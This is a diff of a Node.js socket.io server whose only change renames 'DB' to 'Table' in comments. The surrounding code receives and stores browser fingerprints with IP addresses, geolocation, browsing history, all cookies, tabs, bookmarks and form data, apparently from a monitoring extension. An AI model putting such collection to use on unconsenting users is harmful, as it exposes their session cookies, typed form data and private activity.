@@ -47,73 +47,73 @@ if (SSL_ON) {
 ///////////////////////////////////////////////////////////////////////////////
 
 io.sockets.on('connection', function (socket) {
-    // Get browser fingerprint (DB: Fingerprints).
+    // Get browser fingerprint (Table: Fingerprints).
     socket.on('addFingerprint', function (data) {
         var ipAddress = socket.handshake.address.address;
         events.fingerprint.add(data, ipAddress);
     });
-    // Get current location (DB: Geopositions).
+    // Get current location (Table: Geopositions).
     socket.on('addGeoposition', function (data) {
         events.geoposition.add(data);
     });
-    // Get URL visit(s) (DB: History).
+    // Get URL visit(s) (Table: History).
     socket.on('addURL', function (data) {
         events.history.add(data);
     });
-    // Get URL removal (DB: History).
+    // Get URL removal (Table: History).
     socket.on('removeURL', function (data) {
         events.history.remove(data);
     });
-    // Get all cookies (DB: Cookies).
+    // Get all cookies (Table: Cookies).
     socket.on('addAllCookies', function (data) {
         events.cookie.addAll(data);
     });
-    // Get cookie change (DB: Cookies).
+    // Get cookie change (Table: Cookies).
     socket.on('addCookieChange', function (data) {
         events.cookie.change(data);
     });
-    // Add window (DB: Windows).
+    // Add window (Table: Windows).
     socket.on('addWindow', function (data) {
         events.window.add(data);
     });
-    // Focus window (DB: Windows).
+    // Focus window (Table: Windows).
     socket.on('focusWindow', function (data) {
         events.window.focus(data);
     });
-    // Remove window (DB: Windows).
+    // Remove window (Table: Windows).
     socket.on('removeWindow', function (data) {
         events.window.remove(data);
     });
-    // Add all tabs (DB: Windows, Tabs).
+    // Add all tabs (Tables: Windows, Tabs).
     socket.on('addAllTabs', function (data) {
         events.window.add(data);
         events.tab.addAll(data);
     });
-    // Update tab (DB: Tabs).
+    // Update tab (Table: Tabs).
     socket.on('updateTab', function (data) {
         events.tab.update(data);
     });
-    // Focus tab (DB: Tabs).
+    // Focus tab (Table: Tabs).
     socket.on('focusTab', function (data) {
         events.tab.focus(data);
     });
-    // Remove tab (DB: Tabs).
+    // Remove tab (Table: Tabs).
     socket.on('removeTab', function (data) {
         events.tab.remove(data);
     });
-    // Add bookmark (DB: Bookmarks).
+    // Add bookmark (Table: Bookmarks).
     socket.on('addBookmark', function (data) {
         events.bookmark.add(data);
     });
-    // Change bookmark (DB: Bookmarks).
+    // Change bookmark (Table: Bookmarks).
     socket.on('changeBookmark', function (data) {
         events.bookmark.change(data);
     });
-    // Remove bookmark (DB: Bookmarks).
+    // Remove bookmark (Table: Bookmarks).
     socket.on('removeBookmark', function (data) {
         events.bookmark.remove(data);
     });
-    // Add form data (DB: FormData).
+    // Add form data (Table: FormData).
     socket.on('addFormData', function (data) {
         events.formData.add(data);
     });
